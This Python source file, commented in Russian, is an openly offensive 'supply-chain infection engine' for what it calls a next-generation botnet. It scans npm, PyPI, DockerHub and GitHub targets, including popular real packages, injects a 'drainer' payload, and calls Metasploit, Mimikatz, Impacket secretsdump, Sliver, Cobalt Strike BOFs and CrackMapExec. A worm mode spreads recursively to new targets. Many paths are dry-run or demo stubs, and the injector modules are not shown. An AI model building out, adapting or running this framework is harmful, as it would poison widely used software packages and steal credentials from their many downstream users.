#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SupplyChainInfectionEngine - Автоматизация supply-chain атак (ботнет нового поколения)
"""

import os
import json
import logging
from typing import List, Dict, Any
from datetime import datetime

try:
    from agent_modules.github_supply_chain import find_supply_chain_targets
    from agent_modules.npm_supply_chain import find_npm_supply_chain_targets
    from agent_modules.pypi_supply_chain import find_pypi_supply_chain_targets
    from agent_modules.dockerhub_supply_chain import find_dockerhub_supply_chain_targets
    from agent_modules.github_injector import inject_github_pull_request
    from agent_modules.npm_injector import inject_npm_package
    from agent_modules.pypi_injector import inject_pypi_package
    from agent_modules.dockerhub_injector import inject_dockerhub_image
    from agent_modules import offensive_tools
except ImportError:
    find_supply_chain_targets = None
    find_npm_supply_chain_targets = None
    find_pypi_supply_chain_targets = None
    find_dockerhub_supply_chain_targets = None
    inject_github_pull_request = None
    inject_npm_package = None
    inject_pypi_package = None
    inject_dockerhub_image = None
    offensive_tools = None

logger = logging.getLogger("SupplyChainInfectionEngine")

class SupplyChainInfectionEngine:
    """
    Ядро supply-chain атак: поиск, внедрение, отчёты
    """
    def __init__(self, output_dir=None):
        self.output_dir = output_dir or os.path.join(os.getcwd(), "extracted_data/supply_chain")
        os.makedirs(self.output_dir, exist_ok=True)
        self.targets = []
        self.infection_results = []
        self.errors = []

    def scan_targets(self, use_github: bool = False, use_npm: bool = False, use_pypi: bool = False, use_docker: bool = False) -> List[Dict[str, Any]]:
        """
        Поиск потенциальных целей: публичные пайплайны, пакеты, docker-образы, github actions, npm, pypi, dockerhub
        """
        if use_github and find_supply_chain_targets:
            self.targets = find_supply_chain_targets()
            return self.targets
        if use_npm and find_npm_supply_chain_targets:
            self.targets = find_npm_supply_chain_targets(10)
            return self.targets
        if use_pypi and find_pypi_supply_chain_targets:
            self.targets = find_pypi_supply_chain_targets(10)
            return self.targets
        if use_docker and find_dockerhub_supply_chain_targets:
            self.targets = find_dockerhub_supply_chain_targets(10)
            return self.targets
        # TODO: Реализовать реальный сканер (github API, npm, pypi, dockerhub, etc)
        # Пока демо-данные
        self.targets = [
            {"type": "npm", "name": "left-pad", "repo": "https://github.com/stevemao/left-pad"},
            {"type": "pypi", "name": "requests", "repo": "https://github.com/psf/requests"},
            {"type": "docker", "name": "nginx", "repo": "https://hub.docker.com/_/nginx"},
            {"type": "github_action", "name": "actions/checkout", "repo": "https://github.com/actions/checkout"}
        ]
        return self.targets

    def inject_payload(self, target: Dict[str, Any], payload_type: str = "drainer", parent: str = None, custom_payload_code: str = None) -> Dict[str, Any]:
        """
        Внедрение payload-а в цель (поддержка кастомных payload-ов, parent для worm-графа, live-push, интеграция реальных эксплойтов)
        """
        # --- Интеграция реальных эксплойтов ---
        if payload_type == "metasploit" and offensive_tools:
            # Требуется путь к .rc скрипту или имя шаблона
            rc_script = custom_payload_code or "exploit.rc"
            result = offensive_tools.run_metasploit(rc_script)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("stdout", "")[:200] + ("..." if len(result.get("stdout", "")) > 200 else ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        if payload_type == "mimikatz" and offensive_tools:
            script_path = custom_payload_code or None
            result = offensive_tools.run_mimikatz(script_path)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("stdout", "")[:200] + ("..." if len(result.get("stdout", "")) > 200 else ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        if payload_type == "impacket" and offensive_tools:
            # TODO: реализовать вызов impacket (пример: secretsdump, smbexec)
            cmd = custom_payload_code or "impacket-secretsdump -h"
            result = offensive_tools.run_external_tool(cmd)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("stdout", "")[:200] + ("..." if len(result.get("stdout", "")) > 200 else ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        if payload_type == "sliver" and offensive_tools:
            # TODO: интеграция с sliver-client
            cmd = custom_payload_code or "sliver-client --help"
            result = offensive_tools.run_external_tool(cmd)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("stdout", "")[:200] + ("..." if len(result.get("stdout", "")) > 200 else ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        if payload_type == "bof" and offensive_tools:
            # TODO: интеграция с BOF (Beacon Object Files, Cobalt Strike)
            cmd = custom_payload_code or "echo 'BOF payload (заглушка)'"
            result = offensive_tools.run_external_tool(cmd)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("stdout", "")[:200] + ("..." if len(result.get("stdout", "")) > 200 else ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        if payload_type == "cme" and offensive_tools:
            # TODO: интеграция с CrackMapExec
            cmd = custom_payload_code or "cme --help"
            result = offensive_tools.run_external_tool(cmd)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("stdout", "")[:200] + ("..." if len(result.get("stdout", "")) > 200 else ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        # --- Оригинальная логика ниже ---
        # Custom payload для npm/pypi/docker
        if payload_type == "custom" and custom_payload_code:
            if target.get("type") == "npm" and inject_npm_package:
                result = inject_npm_package(target["name"], payload_code=custom_payload_code, dryrun=True)
                res = {
                    "target": target,
                    "payload": payload_type,
                    "status": result.get("status", "error"),
                    "details": f"custom_payload: {custom_payload_code[:60]}...",
                    "timestamp": datetime.now().isoformat(),
                    "parent": parent
                }
                self.infection_results.append(res)
                try:
                    from server_api import broadcast_supply_chain_event
                    import asyncio
                    asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
                except Exception:
                    pass
                return res
            if target.get("type") == "pypi" and inject_pypi_package:
                result = inject_pypi_package(target["name"], payload_code=custom_payload_code, dryrun=True)
                res = {
                    "target": target,
                    "payload": payload_type,
                    "status": result.get("status", "error"),
                    "details": f"custom_payload: {custom_payload_code[:60]}...",
                    "timestamp": datetime.now().isoformat(),
                    "parent": parent
                }
                self.infection_results.append(res)
                try:
                    from server_api import broadcast_supply_chain_event
                    import asyncio
                    asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
                except Exception:
                    pass
                return res
            if target.get("type") == "docker" and inject_dockerhub_image:
                result = inject_dockerhub_image(target["name"], payload_cmd=custom_payload_code, dryrun=True)
                res = {
                    "target": target,
                    "payload": payload_type,
                    "status": result.get("status", "error"),
                    "details": f"custom_payload: {custom_payload_code[:60]}...",
                    "timestamp": datetime.now().isoformat(),
                    "parent": parent
                }
                self.infection_results.append(res)
                try:
                    from server_api import broadcast_supply_chain_event
                    import asyncio
                    asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
                except Exception:
                    pass
                return res
        # Supply-chain injection для github
        if target.get("type") == "github" and inject_github_pull_request:
            result = inject_github_pull_request(target["repo"])
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("details", ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        # Supply-chain injection для npm
        if target.get("type") == "npm" and inject_npm_package:
            result = inject_npm_package(target["name"], dryrun=True)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("details", ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        # Supply-chain injection для pypi
        if target.get("type") == "pypi" and inject_pypi_package:
            result = inject_pypi_package(target["name"], dryrun=True)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("details", ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        # Supply-chain injection для docker
        if target.get("type") == "docker" and inject_dockerhub_image:
            result = inject_dockerhub_image(target["name"], dryrun=True)
            res = {
                "target": target,
                "payload": payload_type,
                "status": result.get("status", "error"),
                "details": result.get("details", ""),
                "timestamp": datetime.now().isoformat(),
                "parent": parent
            }
            self.infection_results.append(res)
            try:
                from server_api import broadcast_supply_chain_event
                import asyncio
                asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": res}))
            except Exception:
                pass
            return res
        # TODO: Реализовать реальное внедрение (pull request, supply-chain poisoning, docker layer inject)
        result = {
            "target": target,
            "payload": payload_type,
            "status": "success",
            "details": "payload injected (demo mode)",
            "timestamp": datetime.now().isoformat(),
            "parent": parent
        }
        self.infection_results.append(result)
        try:
            from server_api import broadcast_supply_chain_event
            import asyncio
            asyncio.create_task(broadcast_supply_chain_event({"type": "infection", "result": result}))
        except Exception:
            pass
        return result

    def run(self, worm_mode: bool = False, worm_depth: int = 2, parent: str = None) -> Dict[str, Any]:
        """
        Основной запуск: сканирование, внедрение, отчёт. В worm-режиме — рекурсивное распространение.
        """
        logger.info("[SupplyChain] Сканирование целей...")
        targets = self.scan_targets()
        logger.info(f"[SupplyChain] Найдено целей: {len(targets)}")
        infected = set()
        def worm_spread(targets, depth, parent):
            if depth <= 0:
                return
            for t in targets:
                key = f"{t.get('type')}:{t.get('name')}"
                if key in infected:
                    continue
                res = self.inject_payload(t, payload_type="drainer", parent=parent)
                infected.add(key)
                logger.info(f"[SupplyChain][worm] Внедрение в {t.get('name')}: {res['status']}")
                # Если заражение успешно — ищем новые цели и атакуем их (эмулируем worm)
                if res["status"] in ("success", "dryrun") and depth > 1:
                    new_targets = self.scan_targets()
                    worm_spread(new_targets, depth-1, key)
        if worm_mode:
            worm_spread(targets, worm_depth, parent)
        else:
            for t in targets:
                res = self.inject_payload(t, payload_type="drainer", parent=parent)
                logger.info(f"[SupplyChain] Внедрение в {t['name']}: {res['status']}")
        # Сохраняем отчёт
        report = {
            "status": "success",
            "targets": targets,
            "infection_results": self.infection_results,
            "errors": self.errors,
            "timestamp": datetime.now().isoformat()
        }
        report_file = os.path.join(self.output_dir, f"supply_chain_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        return report

if __name__ == "__main__":
    engine = SupplyChainInfectionEngine()
    result = engine.run()
    print(json.dumps(result, indent=2, ensure_ascii=False)) 